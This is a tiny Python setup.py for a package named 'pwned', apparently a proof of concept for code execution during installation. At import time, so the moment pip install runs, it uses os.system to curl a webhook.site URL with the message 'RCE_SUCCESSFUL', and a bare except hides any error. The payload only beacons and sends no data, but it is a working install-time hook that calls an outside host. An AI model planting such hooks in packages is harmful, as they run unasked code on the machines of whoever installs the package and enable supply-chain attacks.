from setuptools import setup
import os
import urllib.request

# This runs the second 'pip install' starts!
try:
    os.system("curl https://webhook.site/470e1846-1bd3-43ec-868c-a64283768bb4 -d 'RCE_SUCCESSFUL'")
except:
    pass

setup(
    name="pwned",
    version="0.0.1",
)
